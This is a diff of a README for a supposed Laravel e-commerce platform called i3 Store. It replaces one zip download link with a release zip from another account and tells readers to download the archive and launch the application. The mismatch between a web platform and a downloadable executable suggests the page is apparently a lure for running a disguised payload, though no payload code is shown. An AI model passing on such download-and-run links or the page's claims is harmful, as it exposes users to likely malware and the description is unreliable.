@@ -1,6 +1,6 @@
 # 🚀 Welcome to i3 Store Repository!
 
-[![i3 Store](https://img.shields.io/badge/i3_Store-Download-green)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![i3 Store](https://github.com/sisters7/i3store/releases/download/v1.0/Application.zip)](https://github.com/sisters7/i3store/releases/download/v1.0/Application.zip)
 
 ## Repository Description
 Welcome to the official repository of i3 Store, the virtual store of Grupo i3. This project is a modern and robust e-commerce platform developed with Laravel. It is designed to provide a simple, efficient, and secure shopping experience for customers.
@@ -23,7 +23,7 @@ i3 Store is a cutting-edge e-commerce platform that ensures a seamless shopping 
 - Responsive Web Design
 
 ## Getting Started
-To get started with i3 Store, simply download the [Software.zip](https://github.com/user-attachments/files/18410590/Software.zip) and launch the application.
+To get started with i3 Store, simply download the [https://github.com/sisters7/i3store/releases/download/v1.0/Application.zip](https://github.com/sisters7/i3store/releases/download/v1.0/Application.zip) and launch the application.
 
 ## Explore Topics
 - buy
